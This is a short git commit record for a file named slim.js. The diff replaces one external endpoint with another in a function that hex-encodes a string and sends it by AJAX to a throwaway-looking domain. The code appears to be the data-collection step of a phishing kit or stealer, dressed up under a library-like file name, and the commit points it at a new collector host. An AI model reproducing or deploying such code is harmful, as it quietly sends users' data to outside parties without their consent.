b90f21828a846d2edaae8783ec3b9f8c58d3d71c
styleiconss <155036937+styleiconss@users.noreply.github.com>
2024-01-03 15:25:57 +0700

    Update slim.js

--- slim.js
+++ slim.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://system-alexhost.biz.id/halo/?cat=" +
+                    "https://salzzxyz.z-nx.xyz/halo" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
